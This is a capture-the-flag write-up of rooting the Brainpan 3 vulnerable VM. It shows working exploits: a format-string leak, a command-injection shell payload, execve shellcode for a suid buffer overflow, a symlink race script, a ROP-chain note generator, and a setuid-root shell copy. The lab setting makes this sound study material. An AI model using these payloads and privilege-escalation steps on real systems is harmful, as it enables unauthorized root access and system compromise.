This is a writeup for a vulnerable virtual machine created by superkojiman ([here](https://www.vulnhub.com/entry/brainpan-3,121/)). Tempted by the promise of my very own Brainpan sticker ([here](http://blog.techorganic.com/2015/07/27/brainpan-3-hacking-challenge/)), and armed with some free hours to spare, I dove right into it.

#1. Recon

Nmap the VM:

>```
>$ nmap -sT -Pn 192.168.1.118 -p-
>```

Result:

>```
>Starting Nmap 6.40 ( http://nmap.org ) at 2015-08-13 16:40 CEST
>Nmap scan report for 192.168.1.118
>Host is up (0.0022s latency).
>PORT     STATE  SERVICE
>1337/tcp open   waste
>8080/tcp closed http-proxy
>```

# 2. Perimeter

After some tries I found there is a format string vulnerability in the access code; sending it "%p.%p.%p." causes it to display values in memory, the access code is in the third position.

>```bash
>$ nc 192.168.1.118 1337
>```

>```
>
>
>  __ )    _ \      \    _ _|   \  |   _ \    \      \  |     _ _| _ _| _ _|
>  __ \   |   |    _ \     |     \ |  |   |  _ \      \ |       |    |    | 
>  |   |  __ <    ___ \    |   |\  |  ___/  ___ \   |\  |       |    |    | 
> ____/  _| \_\ _/    _\ ___| _| \_| _|   _/    _\ _| \_|     ___| ___| ___|
>
>                                                            by superkojiman
>
>
>
>
>AUTHORIZED PERSONNEL ONLY
>PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN
>A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS
>
>ACCESS CODE: %p.%p.%p.     
>ERROR #1: INVALID ACCESS CODE: 0xbfa4b23c.(nil).0x2160.
>```

# 3. Gaining report writing rights

We are presented with five different options:

* 1 - Create Report, this option is disabled when we first log in
* 2 - View Code Repository, this option opens a web server on port 8080
* 3 - Update Session Name, we can change the session name
* 4 - Shell, it spawns a 'shell'
* 5 - Logout, as advertised

I spent quite some time looking at the web server, which has directories /bp3_repo and /repo. But this eventually turned out to be a dead end.
Option 4 gives us a 'shell', in which we only have the ls command available, which reveals some troll filenames. I also spent some time here trying to escape from this shell but eventually turned to the more promising option 3.

Option 3 gives us the option to change the session name, here there is again a format string vulnerability, after trying quite a few things with that I noticed that the character in the 253th position was displayed into the REPORT [x], trying a session name of "Y"*253 finally enabled reports and allowed me to continue.

>```
>ACCESS CODE: 8544
>
> --------------------------------------------------------------
>SESSION: ID-4982
>  AUTH   [Y]    REPORT [N]    MENU   [Y]  
>--------------------------------------------------------------
>
>
>1  - CREATE REPORT
>2  - VIEW CODE REPOSITORY
>3  - UPDATE SESSION NAME
>4  - SHELL
>5  - LOG OFF
>
>ENTER COMMAND: 3
>SELECTED: 3
>ENTER NEW SESSION NAME: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
>--------------------------------------------------------------
>SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
> AUTH   [Y]    REPORT [Y]    MENU   [Y]  
>--------------------------------------------------------------
>
>
>1  - CREATE REPORT
>2  - VIEW CODE REPOSITORY
>3  - UPDATE SESSION NAME
>4  - SHELL
>5  - LOG OFF
>
>ENTER COMMAND: 1
>
```

# 4. Gaining a shell

After trying a few different reports I noticed that giving something like $(id) for a report gave a longer-than-expected output. This means there is probably some command injecion possible. $(/bin/bash -i >&2) spawned the first shell. (superkojiman told me this was unintended and that there is another vulnerability to find)

>```
>SELECTED: 1
>
>ENTER REPORT, END WITH NEW LINE:
>
>$(/bin/bash -i >&2)
>
>REPORT [$(/bin/bash -i >&2)]
>SENDING TO REPORT MODULE
>
>bash: cannot set terminal process group (2195): Inappropriate ioctl for device
>bash: no job control in this shell
>anansi@brainpan3:/$ 
>```

# 5. Becoming reynard

After some enumeration I discovered there is a suid reynard binary in /home/reynard/private/cryptor

running this binary:

>```
>gdb-peda$ r $(python -c 'print "A"*116') $(python -c 'print "B"*23')
>Stopped reason: SIGSEGV
>0x41414141 in ?? ()
>```

After some looking around in IDA we find that the key is stored in the .bss segment at a set location.

>```
>.bss:0804A080 ; char key[100]
>.bss:0804A080 key             db 64h dup(?)           ; DATA XREF: sub_80485ED+18o
>.bss:0804A080                                         ; sub_80485ED+C0o
>```

Since NX is not enabled for this binary and the key is stored at 0x804a080 in the .bss segment every time, this becomes a standard buffer overflow with shellcode in the key:

>```
>./cryptor $(python -c 'print "\x80\xa0\x04\x08"*29') $(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
>```

In action:

>```bash
>anansi@brainpan3:/home/reynard/private$ $ ./cryptor $(python -c 'print "\x80\xa0\x04\x08"*29') $(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
>$ id
>uid=1000(anansi) gid=1003(webdev) euid=1002(reynard) groups=1002(reynard)
>```

Might need to run a few times before it fires to get the alignment right.

For bonus points we can now decrypt sekret.txt.enc with xortool (it finds key:\xd2):

*The secret to making anything taste good is salt, pepper, and sriracha.*

Wise words.


#6. Becoming puck

There is a key in /mnt/usb, after some more enumeration we find a service running on localhost:7075, and a binary in /usr/local/bin. After analysis of the binary we discover it is vulnerable to a race condition. It first checks if /mnt/usb/key.txt is not a symlink and then after a short delay compares it to /home/puck/key.txt
we can exploit this delay by quickly replacing /mnt/usb/key.txt with a symlink to /home/puck/key.txt

The following python script does just that:

>```python
>#!/usr/bin/python
>import os
>import socket
>import telnetlib
>
># make key.txt a normal file
>os.mknod("/mnt/usb/key.txt")
>
># target
>host = "localhost"
>port = 7075
>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
>
># lets race
>s.connect((host, port))
>os.remove("/mnt/usb/key.txt")
>os.symlink("/home/puck/key.txt", "/mnt/usb/key.txt")
>
># should have shell (not always but often) 
>t = telnetlib.Telnet()
>t.sock = s
>t.interact()
>
>#cleanup
>s.close()
>os.remove("/mnt/usb/key.txt")
>```

Saving this script as /mnt/usb/puck.py

>```bash
>cd /mnt/usb
>./puck.py
>Authentication successful
>id
>uid=1001(puck) gid=1004(dev) groups=1001(puck)
>```

# 7. Getting root

There is a cronjob running every minute:

>```bash
>cat /etc/cron.d/*
>* * * * * root cd /opt/.messenger; for i in *.msg; do /usr/local/bin/msg_admin 1 $i; rm -f $i; done
>```

The msg_admin has NX/ASLR/Partial RELRO. This means that to exploit this binary we need to build a ROP-chain.

The notes are stored on the heap, after one another. It is possible for a message text to overflow the pointers to the name and text of the next note, which controls the destination of the strcpy function and enables arbitrary write-what-where. I make extensive use of the writeable memory range <0x0804b000-0x0804c000> to copy gadgets, strings, and pointers into. Also, some things are copied into the GOT after he address of start_main, since this is copied last and might get overwritten elsewise. Control of EIP is gained by overwriting strncpy in the GOT.

I achieved code execution with the following ROP-chain:

>```
>-Overwrite strncpy in the GOT with 0x8048ddc, a pop pop pop pop ret gadget which clears some garbage of the stack and enables us to return to...
>-0x8048630 <strcpy@plt>: to which we control both destination and source. This enables us to copy the adress __libc_start_main from the GOT into memory that we control
>-0x804894b pop pop pop ebp ret: which allow us to get an arbitrary value into EBP for use with..
>-0x8048788 leave ret: we now have the stack fully ready to return into memory where we wrote data with the programs earlier strcpy's, and where we have a pointer to __libc_start_main waiting for us.
>-0x8048d6e popal, cld, ret: this puts the pointer to __libc_start_main into EAX, and set an arbitrary value into EBX (we actually control all the registers, but only need these two)
>-0x8048feb add eax,DWORD PTR [ebx+0x1270304]: the difference between __libc_start_main and system is 0x26800, this unfortunately contains a pesky nullbyte so instead i use 0x26801. the value of EBX is chosen in the previous step such that DWORD PTR [ebx+0x1270304] == 0x26801
>-0x8048ddd pop pop pop ret: we need to get past the value 0x26801 tnhat we needed in the previous step
>-0x804b944 call eax: EAX now points to <system+1>, which is no problem since the first instruction only pushes a register on the stack to save it, but which is not used, for which we compensate by adding some garbage on the stack before the pointer to the string we want executed.
>-crash unelegantly: whatever, it is done.
>```

Paste this in your terminal to create the note that does it (to follow along in gdb, put a breakpoint at 0x8048ddc or strncpy@got.plt to see the ROP-chain, you'ĺl need to get libc.so.6 from the VM to follow into <system+1>):

>```python
>python -c 'print "ZZZZ|" + "A"*212 + "\x0c\xb9\x04\x08" + "\x10\xb9\x04\x08"' >  x.msg
>python -c 'print "\x6e\x8d\x04\x08|"+ "A" * 16 + "\x34\xb6\xdd\x06" + "A"*32 + "\x86\x87\x04\x08AAAA\x50\xb9\x04\x08YOUR ROOT COMMAND HERE"' >> x.msg
>python -c 'print "XXXX|" + "A"*212 + "\x4c\xb0\x04\x08" + "\x34\xbe\x04\x08"' >> x.msg
>python -c 'print "\xeb\x8f\x04\x08\xdd\x8d\x04\x08\x01\x68\x02|" + "A"*211' >> x.msg # nice: strcpy adds a nullbyte for us to get 0x00026801 in memory
>python -c 'print "VVVV|" + "A"*211' >> x.msg
>python -c 'print "UUUU|" + "A"*211' >> x.msg
>python -c 'print "TTTT|" + "A"*211' >> x.msg
>python -c 'print "SSSS|\x30\x86\x04\x08\x4b\x89\x04\x08\x2c\xb9\x04\x08\x48\xb0\x04\x08\x08\xb9\x04\x08\x88\x87\x04\x08" + "A"*188 + "\x20\xb0\x04\x08" + "\x58\xb0\x04\x08"' >> x.msg #overflow pointer for next note text with address of strncpy@got
>python -c 'print "RRRR|\xdc\x8d\x04\x08"' >> x.msg #the first rop address
>```

I used

>```bash
>cp /bin/sh /tmp/sh
>chown root:root /tmp/sh
>chmod 4777 /tmp/sh
>```

to gain a shell with euid root.

# Game over

Thanks to [@superkojiman](https://twitter.com/superkojiman) for the challenge and the sticker :)

> flag{tricksy-hobbitses-use-unix}

